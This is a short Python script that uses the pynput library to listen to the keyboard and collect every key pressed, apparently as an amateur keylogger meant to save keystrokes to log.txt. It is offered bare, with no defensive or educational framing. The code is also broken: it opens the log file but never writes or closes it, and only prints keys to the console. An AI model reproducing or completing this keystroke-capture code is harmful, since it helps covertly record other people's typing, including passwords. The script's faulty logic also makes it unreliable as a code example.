from pynput import keyboard
import os
key_list = []
press_count = 0

def write_to_file(key_list):
    # checks if log.txt exists
    if not (os.path.exists("log.txt")):
        file = open("log.txt",'w')
        file.close()
    file = open("log.txt",'a')
    for key in key_list:
        if key == keyboard.Key.space:

            clean_key = str(key).replace("Key.","")
        else:
            clean_key = str(key).replace("'","")
        print(key)

def on_press(key):
    try:
        print('{0} key pressed'.format(key.char))
        key_list.append(key)

    except AttributeError:
        print('{0} key pressed'.format(key))

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stops  the listener
        return False
    write_to_file(key_list)

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
